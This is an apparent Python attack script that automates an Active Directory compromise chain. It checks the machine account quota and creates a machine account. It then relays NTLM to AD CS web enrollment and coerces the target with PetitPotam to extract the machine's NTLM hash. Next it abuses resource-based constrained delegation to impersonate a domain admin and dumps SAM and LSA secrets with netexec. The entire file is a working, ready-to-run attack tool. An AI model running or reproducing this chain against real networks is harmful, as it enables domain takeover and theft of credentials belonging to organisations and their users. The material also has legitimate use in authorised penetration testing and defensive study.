import subprocess
import getpass
import os
import sys

def run_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"Error running command: {command}\n{result.stderr}")
    else:
        print(f"Command succeeded: {command}\n{result.stdout}")
    return result.stdout.strip()

# New function to run the certipy relay command asynchronously
def run_command_async(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return process

def check_maq(dc_ip, username, password):
    output = run_command(f"nxc ldap {dc_ip} -u {username} -p '{password}' -M maq")
    try:
        maq_value = int(output.split("MachineAccountQuota:")[1].split()[0])
        return maq_value
    except (IndexError, ValueError):
        print("Error parsing MAQ value.")
        return 0

def help():
    help_text = """
Usage: python maq-attack.py

This script automates the process of identifying machine account quotas, creating machine accounts, configuring NTLM relay, coercing target computers, obtaining NTLM hashes, modifying attributes, and dumping SAM and LSA secrets.

Steps:
1. Identify Machine Account Quota (MAQ):
   Runs the `maq-attack ldap` command to check the machine account quota for the specified domain and user.

2. Create Machine Account:
   Uses `certipy` to create a machine account with the specified username, password, and domain controller IP.

3. Configure NTLM Relay With Certipy:
   Uses `certipy` to configure NTLM relay with the specified target and template.

4. Coerce Target Computer With PetitPotam:
   Uses `petitpotam` to coerce the target computer.

5. Get NTLM Hash of Target Machine:
   Uses `certipy auth` to get the NTLM hash of the target machine and captures it for further use.

6. Modify msDS-AllowedToActOnBehalfOfOtherIdentity Attribute:
   Uses `rbcd.py` to modify the specified attribute with the captured NTLM hash.

7. Obtain Service Ticket (ST):
   Uses `getST.py` to obtain the service ticket and captures the ccache file for further use.

8. Import ST to Machine:
   Sets the `KRB5CCNAME` environment variable to the path of the captured ccache file.

9. Dump SAM:
   Uses `netexec` to dump the SAM database from the target machine.

10. Dump LSA Secrets:
    Uses `netexec` to dump the LSA secrets from the target machine.

Parameters:
- domain: The domain name.
- username: The username.
- password: The password.
- machine_acc: The machine account name.
- machine_acc_pw: The machine account password.
- dc_ip: The domain controller IP.
- ad_cs_web_enroll: The AD CS web enroll address.
- your_ip: Your IP address.
- target_ip: The target IP address.
- target_machine: The target machine name.
- domain_admin: The domain admin name.
"""
    print(help_text)

def automate_steps(domain, username, password, machine_acc, machine_acc_pw, dc_ip, ad_cs_web_enroll, your_ip, target_ip, target_machine, domain_admin):
    # Step 1: Identify MAQ
    print("[*] Checking Machine Account Quota (MAQ)...")
    maq_value = check_maq(dc_ip, username, password)
    if maq_value <= 0:
        print("Machine Account Quota is 0. Exiting.")
        return
    print(f"[*] Machine Account Quota (MAQ) found: {maq_value}")

    # Step 2: Create Machine Account
    print("[*] Creating machine account...")
    run_command(f"certipy account create -u {username}@{domain} -p '{password}' -dc-ip {dc_ip} -user {machine_acc}$ -pass '{machine_acc_pw}'")

    # Step 3: Configure NTLM Relay With Certipy (Async)
    print("[*] Configuring NTLM relay with Certipy...")
    certipy_process = run_command_async(f"certipy relay -target http://{ad_cs_web_enroll} -template Machine")
    print("[*] NTLM relay running in background...")

    # Step 4: Coerce Target Computer With PetitPotam
    print("[*] Coercing target computer with PetitPotam...")
    home_dir = os.path.expanduser("~")
    run_command(f"python3 {home_dir}/PetitPotam/PetitPotam.py -u {username}@{domain} -p '{password}' {your_ip} {target_ip}")
    print("[*] Target coercion complete.")

    # Step 5: Get NTLM Hash of Target Machine
    print("[*] Authenticating with Certipy to get NTLM hash of the target machine...")
    pfx_output = run_command(f"certipy auth -pfx {machine_acc}.pfx")

    # Extract NTLM hash from the output
    ntlm_hash = None
    for line in pfx_output.split('\n'):
        if "NTLM hash" in line:
            ntlm_hash = line.split(":")[-1].strip()
            break

    if not ntlm_hash:
        print("NTLM hash not found in the output of certipy auth. Exiting.")
        return
    print(f"[*] NTLM hash obtained: {ntlm_hash}")

    # Step 6: Modify msDS-AllowedToActOnBehalfOfOtherIdentity Attribute
    print("[*] Modifying msDS-AllowedToActOnBehalfOfOtherIdentity attribute...")
    run_command(f"python3 /usr/local/bin/rbcd.py -action write -delegate-to {target_machine} -delegate-from {machine_acc}$ {domain}/{target_machine} -hashes ':{ntlm_hash}'")

    # Step 7: Obtain Service Ticket (ST)
    print("[*] Obtaining Service Ticket (ST)...")
    st_output = run_command(f"python3 /usr/local/bin/getST.py -spn cifs/{target_machine} '{domain}/{machine_acc}$' -impersonate {domain_admin} -dc-ip {dc_ip}")

    # Extract the ccache file name from the output
    ccache_file = None
    for line in st_output.split('\n'):
        if "Generated TGT" in line:
            ccache_file = line.split(":")[-1].strip()
            break

    if not ccache_file:
        print("ccache file not found in the output of getST.py. Exiting.")
        return
    print(f"[*] Ccache file obtained: {ccache_file}")

    # Step 8: Import ST to Machine
    print(f"[*] Importing Service Ticket: {ccache_file}")
    os.environ['KRB5CCNAME'] = ccache_file

    # Step 9: Dump SAM
    print("[*] Dumping SAM database...")
    run_command(f"netexec smb {target_machine} -u {machine_acc}$ --use-kcache -k --sam")

    # Step 10: Dump LSA Secrets
    print("[*] Dumping LSA secrets...")
    run_command(f"netexec smb {target_machine} -u {machine_acc}$ --use-kcache -k --lsa")

    # Wait for Certipy relay process to finish and print its output
    print("[*] Waiting for Certipy relay to complete...")
    stdout, stderr = certipy_process.communicate()
    print(f"Certipy Relay Output: \n{stdout}")
    if stderr:
        print(f"Certipy Relay Errors: \n{stderr}")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] in ['-h', '--help']:
        help()
        sys.exit(0)

    # Parameters
    domain = input("Enter the domain: ")
    username = input("Enter the username: ")
    password = getpass.getpass("Enter the password: ")
    machine_acc = input("Enter the machine account name: ")
    machine_acc_pw = getpass.getpass("Enter the machine account password: ")
    dc_ip = input("Enter the domain controller IP: ")
    ad_cs_web_enroll = input("Enter the AD CS web enroll address: ")
    your_ip = input("Enter your IP address: ")
    target_ip = input("Enter the target IP address: ")
    target_machine = input("Enter the target machine name: ")
    domain_admin = input("Enter the domain admin name: ")

    automate_steps(domain, username, password, machine_acc, machine_acc_pw, dc_ip, ad_cs_web_enroll, your_ip, target_ip, target_machine, domain_admin)
